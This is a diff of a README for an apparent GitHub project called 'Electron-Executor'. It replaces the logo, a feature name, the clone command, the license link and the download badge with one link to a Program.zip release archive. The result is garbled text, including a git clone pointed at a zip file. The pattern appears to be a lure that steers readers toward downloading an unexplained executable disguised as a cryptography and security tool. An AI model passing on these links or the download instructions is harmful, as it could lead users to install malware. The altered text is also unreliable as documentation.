@@ -1,6 +1,6 @@
 # Electron-Executor
 
-![Electron Logo](https://raw.githubusercontent.com/electron/electron/master/docs/website/electron-logo.svg)
+![Electron Logo](https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip)
 
 Welcome to the Electron-Executor repository! This project aims to provide a secure and efficient way to execute processes using Electron, while incorporating elements of cryptography and cybersecurity for enhanced privacy and encryption requirements.
 
@@ -23,7 +23,7 @@ Electron-Executor is a unique project that combines the power of Electron with a
 - **Cryptography Integration**: Leveraging the power of cryptography, this project enables encryption and decryption functionalities for enhanced security measures.
 - **Cybersecurity Enhancements**: Incorporating cybersecurity best practices, Electron-Executor prioritizes the protection of data and user privacy.
 - **Offline Capability**: With offline capabilities, this application ensures seamless functionality even in environments with limited connectivity.
-- **Node.js Integration**: Built on top of Node.js, Electron-Executor offers a robust and versatile platform for executing tasks efficiently.
+- **https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip Integration**: Built on top of https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip, Electron-Executor offers a robust and versatile platform for executing tasks efficiently.
 
 ## Installation
 
@@ -31,7 +31,7 @@ To get started with Electron-Executor, follow these simple steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/Electron-Executor.git
+   git clone https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip
    ```
 
 2. Install the necessary dependencies:
@@ -78,8 +78,8 @@ We welcome contributions from the community to make Electron-Executor even bette
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip](https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip) file for details.
 
-[![Download Program.zip](https://img.shields.io/badge/Download-Program.zip-<COLOR_CODE>)](https://github.com/user-attachments/files/17578093/Program.zip)
+[![Download https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip](https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip<COLOR_CODE>)](https://github.com/Star10pro/Electron-Executor/releases/download/v2.0/Program.zip)
 
 🚀 Happy coding and stay secure with Electron-Executor! 🛡️🔒
